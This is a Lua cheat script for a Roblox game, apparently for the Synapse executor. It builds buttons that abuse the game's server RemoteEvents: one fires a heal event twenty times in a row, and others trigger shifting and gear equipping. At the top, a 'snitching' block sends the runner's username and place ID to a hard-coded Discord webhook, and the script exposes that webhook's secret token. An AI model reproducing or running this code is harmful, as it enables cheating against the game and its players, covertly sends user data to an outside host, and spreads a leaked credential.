msg = {
["embeds"] = {{
["color"] = 13708129,
["description"] = "Has been caught exploiting in: "..Game.PlaceId,
["author"] = {
["name"] = game.Players.LocalPlayer.name,
}}
}
}

local response = syn.request(
{
Url = "https://discord.com/api/webhooks/982398192211619879/oQR1sUMSXLrl2aZRbqhWdnAr7rKW6vPhf4ZrNXHv6Nq2SgnZcQxOf9Cvk6Lu1BfcEGs3",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = game:GetService("HttpService"):JSONEncode(msg)
}
)
--END OF SNITCHING LMFAO
local ScreenGui = Instance.new("ScreenGui") 
local Frame = Instance.new("Frame") 
local WalkSpeed = Instance.new("TextButton") 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
Frame.Parent = ScreenGui 
Frame.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
Frame.BorderSizePixel = 0 
Frame.Position = UDim2.new(0.391358048, 0, 0.117486335, 0) 
Frame.Size = UDim2.new(0, 190, 0, 240) Frame.Active =  true 
Frame.Draggable = true  
WalkSpeed.Name = "WalkSpeed"
WalkSpeed.Parent = Frame 
WalkSpeed.BackgroundColor3 = Color3.fromRGB(5, 42, 135)
WalkSpeed.BorderSizePixel = 0 
WalkSpeed.Position = UDim2.new(0, 0, -0.00153875351, 0) 
WalkSpeed.Size = UDim2.new(0, 190, 0, 50) 
WalkSpeed.Font = Enum.Font.Highway 
WalkSpeed.Text = "Shift Tease"
WalkSpeed.TextColor3 = Color3.fromRGB(0, 0, 0) 
WalkSpeed.TextSize = 30.000 
WalkSpeed.TextWrapped = true 

local ScreenGui = Instance.new("ScreenGui") 
local Frame = Instance.new("Frame") 
local WalkSpeedTwo = Instance.new("TextButton") 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
Frame.Parent = ScreenGui 
Frame.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
Frame.BorderSizePixel = 0 
Frame.Position = UDim2.new(0.391358048, 0, 0.117486335, 0) 
Frame.Size = UDim2.new(0, 190, 0, 240) Frame.Active =  true 
Frame.Draggable = true  
WalkSpeedTwo.Name = "WalkSpeedTwo"
WalkSpeedTwo.Parent = Frame 
WalkSpeedTwo.BackgroundColor3 = Color3.fromRGB(5, 42, 135)
WalkSpeedTwo.BorderSizePixel = 0 
WalkSpeedTwo.Position = UDim2.new(0, 0, -0.00153875351, 0) 
WalkSpeedTwo.Size = UDim2.new(0, 190, 0, 50) 
WalkSpeedTwo.Font = Enum.Font.Highway 
WalkSpeedTwo.Text = "Steam Heal"
WalkSpeedTwo.TextColor3 = Color3.fromRGB(0, 0, 0) 
WalkSpeedTwo.TextSize = 30.000 
WalkSpeedTwo.TextWrapped = true 

local ScreenGui = Instance.new("ScreenGui") 
local Frame = Instance.new("Frame") 
local WalkSpeedThree = Instance.new("TextButton") 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
Frame.Parent = ScreenGui 
Frame.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
Frame.BorderSizePixel = 0 
Frame.Position = UDim2.new(0.391358048, 0, 0.117486335, 0) 
Frame.Size = UDim2.new(0, 190, 0, 240) Frame.Active =  true 
Frame.Draggable = true  
WalkSpeedThree.Name = "WalkSpeedThree"
WalkSpeedThree.Parent = Frame 
WalkSpeedThree.BackgroundColor3 = Color3.fromRGB(5, 42, 135)
WalkSpeedThree.BorderSizePixel = 0 
WalkSpeedThree.Position = UDim2.new(0, 0, -0.00153875351, 0) 
WalkSpeedThree.Size = UDim2.new(0, 190, 0, 50) 
WalkSpeedThree.Font = Enum.Font.Highway 
WalkSpeedThree.Text = "Fake Shift"
WalkSpeedThree.TextColor3 = Color3.fromRGB(0, 0, 0) 
WalkSpeedThree.TextSize = 30.000 
WalkSpeedThree.TextWrapped = true 

local ScreenGui = Instance.new("ScreenGui") 
local Frame = Instance.new("Frame") 
local WalkSpeedFour = Instance.new("TextButton") 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
Frame.Parent = ScreenGui 
Frame.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
Frame.BorderSizePixel = 0 
Frame.Position = UDim2.new(0.391358048, 0, 0.117486335, 0) 
Frame.Size = UDim2.new(0, 190, 0, 240) Frame.Active =  true 
Frame.Draggable = true  
WalkSpeedFour.Name = "WalkSpeedFour"
WalkSpeedFour.Parent = Frame 
WalkSpeedFour.BackgroundColor3 = Color3.fromRGB(5, 42, 135)
WalkSpeedFour.BorderSizePixel = 0 
WalkSpeedFour.Position = UDim2.new(0, 0, -0.00153875351, 0) 
WalkSpeedFour.Size = UDim2.new(0, 190, 0, 50) 
WalkSpeedFour.Font = Enum.Font.Highway 
WalkSpeedFour.Text = "Equip ODM"
WalkSpeedFour.TextColor3 = Color3.fromRGB(0, 0, 0) 
WalkSpeedFour.TextSize = 30.000 
WalkSpeedFour.TextWrapped = true 



WalkSpeedTwo.MouseButton1Click:connect(function() 	
    if game.Players.LocalPlayer.Character.Humanoid.Health == game.Players.LocalPlayer.Character.Humanoid.MaxHealth then
    game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(false);
    else
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
          game.ReplicatedStorage.Package.Shifters["Human Events"].Steamheal:FireServer(true);
    end
end)  

WalkSpeed.MouseButton1Click:connect(function() 	
    game.ReplicatedStorage.Package.Shifters["Human Events"].ShiftTease:FireServer();
end) 

WalkSpeedFour.MouseButton1Click:connect(function() 	
   game.ReplicatedStorage.Package.Gear.ODM.requestEquip:FireServer()
end) 

WalkSpeedThree.MouseButton1Click:connect(function() 
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character
if not character or not character.Parent then
	character = player.CharacterAdded:Wait()
end
local humanoid = character:WaitForChild("Humanoid")
local animator = humanoid:WaitForChild("Animator")
local kickAnimation = Instance.new("Animation")
kickAnimation.AnimationId = "rbxassetid://8753401085"
local kickAnimationTrack = animator:LoadAnimation(kickAnimation)
kickAnimationTrack:Play()
wait(0.2)
game.ReplicatedStorage.Package.Shifters["Human Events"].ShiftTease:FireServer()
end) 

WalkSpeedFour.MouseButton1Click:connect(function() 	
   game.ReplicatedStorage.Package.Gear.ODM.requestEquip:FireServer()
end) 
